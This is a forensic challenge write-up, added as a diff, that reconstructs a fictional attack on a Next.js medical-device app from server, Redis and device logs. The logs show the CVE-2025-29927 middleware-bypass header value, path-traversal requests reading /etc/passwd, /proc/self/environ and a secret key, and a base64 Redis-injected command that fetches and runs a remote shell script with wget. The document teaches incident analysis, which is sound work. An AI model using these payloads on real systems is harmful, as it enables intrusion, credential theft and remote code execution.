@@ -1,0 +1,125 @@
+NeuroSync-D 
+
+NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.
+Artifacts given:
+Redis.log
+Interface.log
+Data-api.log
+Bci-device.log
+Access.log
+
+What version of Next.js is the application using?
+
+In the interface.log:
+
+> neurosync@0.1.0 dev
+> next dev
+
+   ▲ Next.js 15.1.0
+   - Local:        http://localhost:3000
+   - Network:      http://172.17.0.2:3000
+   - Experiments (use with caution):
+     · webpackBuildWorker
+     · parallelServerCompiles
+     · parallelServerBuildTraces
+
+
+15.1.0 is the answer.
+
+What local port is the Next.js-based application running on?
+
+In the same snippet, 3000 port is used
+
+A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?
+https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+Next.js is a React framework for building full-stack web applications. Starting in version 1.11.4 and prior to versions 12.3.5, 13.5.9, 14.2.25, and 15.2.3, it is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware. If patching to a safe version is infeasible, it is recommend that you prevent external user requests which contain the x-middleware-subrequest header from reaching your Next.js application. This vulnerability is fixed in 12.3.5, 13.5.9, 14.2.25, and 15.2.3.
+Next.js uses middleware to protect pages (like login checks for /admin). When a request comes in, the middleware is supposed to run first before the page is served. However, an attacker can exploit this by sending a spoofed HTTP request with a fake x-middleware-subrequest header. This tricks the server into skipping the middleware check, allowing unauthorized access to protected routes.
+The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?
+10.129.231.211 - - [01/Apr/2025:11:37:44 +0000] "GET /_next/static/chunks/main-app.js HTTP/1.1" 200 1375579 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?
+/api/bci/analytics - as seen in the multiple logs after
+
+How many requests to this endpoint have resulted in an "Unauthorized" response?
+Search in access.log for 401 requests
+
+When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?
+10.129.231.211 - - [01/Apr/2025:11:37:58 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+10.129.231.211 - - [01/Apr/2025:11:37:59 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+10.129.231.211 - - [01/Apr/2025:11:38:01 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+10.129.231.211 - - [01/Apr/2025:11:38:02 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+10.129.231.211 - - [01/Apr/2025:11:38:04 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+10.129.231.211 - - [01/Apr/2025:11:38:05 +0000] "GET /api/bci/analytics HTTP/1.1" 200 737 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
+After the 401 messages, we see a 200 which shows bypassed
+
+Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?
+In interface.log, this request got through to compile and bypass the middleware
+2025-04-01T11:38:04.111Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware:middleware:middleware"],["x-real-ip","10.129.231.211"]]
+ ✓ Compiled /api/bci/analytics in 250ms (606 modules)
+X-middleware-subrequest","middleware:middleware:middleware:middleware
+
+The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?
+From data-api.log 2025-04-01 11:35:09 [VERBOSE] External analytics server is running on port 4000
+Server-Side Request Forgery (SSRF) is a web security vulnerability where an attacker tricks a server into making requests to internal resources or even external services that it wouldn't normally be allowed to access. This can lead to sensitive information exposure, system compromise, or even remote code execution.
+
+After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?
+2025-04-01 11:38:50 [VERBOSE] Incoming request: GET /reports from ::ffff:127.0.0.1
+2025-04-01 11:38:50 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:38:51 [VERBOSE] Incoming request: GET /metrics from ::ffff:127.0.0.1
+2025-04-01 11:38:51 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:38:51 [VERBOSE] Incoming request: GET /version from ::ffff:127.0.0.1
+2025-04-01 11:38:51 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:38:52 [VERBOSE] Incoming request: GET /docs from ::ffff:127.0.0.1
+2025-04-01 11:38:52 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:38:52 [VERBOSE] Incoming request: GET /logs from ::ffff:127.0.0.1
+2025-04-01 11:38:52 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:38:52 [VERBOSE] Received GET /logs request from ::ffff:127.0.0.1
+2025-04-01 11:38:52 [VERBOSE] Requested log file: /var/log/logfile.txt
+2025-04-01 11:38:52 [VERBOSE] Sanitized log file path: /var/log/logfile.txt
+2025-04-01 11:38:52 [VERBOSE] Reading log file: /var/log/logfile.txt
+2025-04-01 11:38:52 [VERBOSE] Log file read successfully.
+2025-04-01 11:38:52 [VERBOSE] Log file contains 3 lines.
+2025-04-01 11:38:52 [VERBOSE] Parsed 2 valid log entries.
+2025-04-01 11:38:52 [VERBOSE] Sending log data response...
+2025-04-01 11:39:01 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//etc/passwd from ::ffff:127.0.0.1
+
+/logs
+When the vulnerable endpoint found was used maliciously for the first time?
+It’s asking when it first started grabbing more log files
+2025-04-01 11:39:01
+2025-04-01 11:39:01 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//etc/passwd from ::ffff:127.0.0.1
+2025-04-01 11:39:01 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:39:01 [VERBOSE] Received GET /logs request from ::ffff:127.0.0.1
+2025-04-01 11:39:01 [VERBOSE] Requested log file: /var/log/../.../...//../.../...//etc/passwd
+2025-04-01 11:39:01 [VERBOSE] Sanitized log file path: /var/log/../../etc/passwd
+2025-04-01 11:39:01 [VERBOSE] Reading log file: /var/log/../../etc/passwd
+2025-04-01 11:39:01 [VERBOSE] Log file read successfully.
+2025-04-01 11:39:01 [VERBOSE] Log file contains 20 lines.
+2025-04-01 11:39:03 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//proc/self/environ from ::ffff:127.0.0.1
+2025-04-01 11:39:03 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
+2025-04-01 11:39:03 [VERBOSE] Received GET /logs request from ::ffff:127.0.0.1
+2025-04-01 11:39:03 [VERBOSE] Requested log file: /var/log/../.../...//../.../...//proc/self/environ
+2025-04-01 11:39:03 [VERBOSE] Sanitized log file path: /var/log/../../proc/self/environ
+2025-04-01 11:39:03 [VERBOSE] Reading log file: /var/log/../../proc/self/environ
+2025-04-01 11:39:03 [VERBOSE] Log file read successfully.
+2025-04-01 11:39:03 [VERBOSE] Log file contains 1 lines.
+What is the attack name the endpoint is vulnerable to?
+It’s using both directory traversal to find the local files, which indicate local file inclusion vulnerability
+Local File Inclusion
+What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
+2025-04-01 11:39:24 [VERBOSE] Requested log file: /var/log/../.../...//../.../...//tmp/secret.key
+2025-04-01 11:39:24 [VERBOSE] Sanitized log file path: /var/log/../../tmp/secret.key
+2025-04-01 11:39:24 [VERBOSE] Reading log file: /var/log/../../tmp/secret.key
+2025-04-01 11:39:24 [VERBOSE] Log file read successfully.
+2025-04-01 11:39:24 [VERBOSE] Log file contains 1 lines.
+
+Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
+Found in redis.log
+1743507566.415465 [0 127.0.0.1:34502] "RPUSH" "bci_commands" "OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb"
+At 2025-04-01 11:39:01, the attacker leveraged SSRF from the vulnerable Next.js server to target Redis on 127.0.0.1:6379, injecting a command via RPUSH into the bci_commands queue. This command was later executed by a backend process, resulting in Remote Code Execution on the host.
+Once decoded, what is the command?
+It’s encoded in base64, and can also be found in bci-device.log 
+2025-04-01 11:39:26 BCI (Device): Executing OS command: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
+2025-04-01 11:39:26 BCI (Device): Command output: sh: 1: wget: not found
+wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
+
+Sherlock completed
